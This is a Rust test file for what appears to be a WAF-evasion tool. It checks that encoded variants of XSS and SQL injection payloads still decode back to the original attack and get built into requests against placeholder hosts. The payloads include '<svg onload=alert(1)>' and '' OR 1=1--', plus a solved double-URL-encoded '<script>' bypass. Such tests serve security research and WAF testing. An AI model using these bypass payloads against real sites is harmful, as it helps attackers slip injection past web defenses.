//! Truth contract for the equiv bridge: solver/preimage output is the
//! canonical `EquivPayload`, consumed by the *exact* scald loop body
//! with zero per-member handling change, and every member is sound
//! (its declared sink reconstructs the attack — anti-rig).

use wafrift_grammar::grammar::equiv::xss_delivered;
use wafrift_wafmodel::{norm_mismatch_members, sink_for_tag};

#[test]
fn every_bridge_member_reconstructs_the_attack_under_its_declared_sink() {
    let attack = "<svg onload=alert(1)>";
    let members = norm_mismatch_members(attack, "q");

    // double-url + json + html-entity always apply; NFKC folds the angle
    // brackets / `=` / parens of this XSS attack, so it appears too. best-fit
    // has no quote/dash/slash to coerce here, so the skip-degenerate guard
    // correctly omits it (emitting it would be the raw attack).
    let tags: Vec<&str> = members.iter().map(|m| m.rules[0]).collect();
    for required in [
        "norm_mismatch_double_url",
        "norm_mismatch_json_unescape",
        "norm_mismatch_html_entity",
        "norm_mismatch_nfkc",
    ] {
        assert!(
            tags.contains(&required),
            "missing sink member {required}; got {tags:?}"
        );
    }
    assert!(
        !tags.contains(&"norm_mismatch_bestfit"),
        "best-fit no-ops on a quote-free XSS attack — must be skipped, not emitted \
         as the raw attack; got {tags:?}"
    );

    for m in &members {
        let tag = m.rules[0];
        let sink = sink_for_tag(tag).expect("bridge member must name a known sink");
        let decoded = sink.apply(m.payload.as_bytes());
        assert!(
            decoded
                .windows(attack.len())
                .any(|w| w == attack.as_bytes()),
            "member tagged {tag} payload {:?} does NOT decode back to the attack \
             (rigged/unsound bridge member)",
            m.payload
        );
        // It must NOT already be the raw attack (then it'd be pointless
        // as an evasion and the WAF would see it directly).
        assert_ne!(
            m.payload, attack,
            "tag {tag} is the raw attack, not an evasion"
        );
    }
}

#[test]
fn bestfit_member_self_selects_to_a_quoted_sqli_attack() {
    // Twin of the above: the SAME bridge that skips best-fit for a quote-free
    // XSS attack DOES emit it for a quoted SQLi attack, and that curly-quote
    // member best-fit-folds back to the injection (sound, and != the attack).
    let attack = "' OR 1=1--";
    let members = norm_mismatch_members(attack, "q");
    let bestfit = members
        .iter()
        .find(|m| m.rules[0] == "norm_mismatch_bestfit")
        .expect("best-fit must fire on a quoted SQLi attack");
    assert_ne!(
        bestfit.payload, attack,
        "best-fit member must be an evasion, not the raw attack"
    );
    assert!(
        !bestfit.payload.contains('\''),
        "best-fit member must hide the literal single quote: {:?}",
        bestfit.payload
    );
    let decoded = sink_for_tag("norm_mismatch_bestfit")
        .unwrap()
        .apply(bestfit.payload.as_bytes());
    assert!(
        decoded
            .windows(attack.len())
            .any(|w| w == attack.as_bytes()),
        "best-fit member {:?} must coerce back to the injection",
        bestfit.payload
    );
}

#[test]
fn bridge_members_are_consumed_by_the_unchanged_scald_loop() {
    // The EXACT shape of scald's terminal tier: iterate equiv members,
    // build a request via `delivery.to_request`, no special-casing.
    let attack = "<img src=x onerror=alert(1)>";
    let target = "https://victim.example/app";

    // The canonical static catalog AND the bridge members flow through
    // ONE identical loop — proof they are the same type with the same
    // handling (zero downstream change).
    let combined = xss_delivered(attack, 16)
        .into_iter()
        .chain(norm_mismatch_members(attack, "q"));

    let mut built = 0;
    let mut saw_norm_mismatch = false;
    for m in combined {
        let req = m.delivery.to_request(target, &m.payload);
        // Same invariant scald relies on: a real request is produced.
        assert!(req.url().starts_with("https://victim.example"));
        assert!(!m.payload.is_empty());
        if m.rules.iter().any(|r| r.starts_with("norm_mismatch")) {
            saw_norm_mismatch = true;
            // The bridge produced an ENCODED payload (the origin, not
            // wafrift, decodes it). Invariant is on the member payload
            // itself — the delivery layer's own URL-encoding of the
            // query value is orthogonal.
            assert!(
                m.payload.contains("%25")
                    || m.payload.contains("\\u00")
                    || m.payload.contains("&#x")
                    || !m.payload.is_ascii(),
                "normalization-mismatch member must carry an encoded or homoglyph \
                 payload, got {:?}",
                m.payload
            );
        }
        built += 1;
    }
    assert!(built >= 4, "combined catalog must yield members");
    assert!(
        saw_norm_mismatch,
        "the bridge members must appear in the unchanged consumption loop"
    );
}

#[test]
fn solver_solution_becomes_a_canonical_member() {
    use wafrift_types::Request;
    use wafrift_wafmodel::canon::Channel;
    use wafrift_wafmodel::normalize::Transform;
    use wafrift_wafmodel::{
        ChannelSet, Pipeline, Rule, SimRegexWaf, Stage, solution_member, solve_bypass,
    };

    let attack = b"<script>";
    let sink = Pipeline(vec![Stage::DoubleUrlDecode]);
    let mut waf = SimRegexWaf::new(
        vec![Rule {
            id: "941".into(),
            channels: ChannelSet::none().with(Channel::Body),
            transforms: vec![Transform::UrlDecodeUni, Transform::Lowercase],
            pattern: regex::bytes::Regex::new("<script").unwrap(),
            score: 5,
        }],
        5,
    );
    let build = |b: &[u8]| {
        Request::post("https://h/p", b.to_vec()).header("Content-Type", "application/json")
    };
    let sol = solve_bypass(attack, &sink, &mut waf, &build)
        .unwrap()
        .expect("solvable");

    let member =
        solution_member(&sol, "q").expect("solution is valid UTF-8 (R54 pass-16 I5 contract)");
    assert_eq!(member.rules, vec!["solver_bypass"]);
    // The member's payload IS the solved double-encoded bypass.
    assert_eq!(member.payload, "%253Cscript%253E");
    // And it is consumed by the identical delivery path (builds a
    // real request without any bridge-specific handling).
    let req = member
        .delivery
        .to_request("https://target.example/app", &member.payload);
    assert!(
        req.url().starts_with("https://target.example/app"),
        "delivered request URL: {}",
        req.url()
    );
    assert!(req.url().contains("q="), "param carried in the query");
}
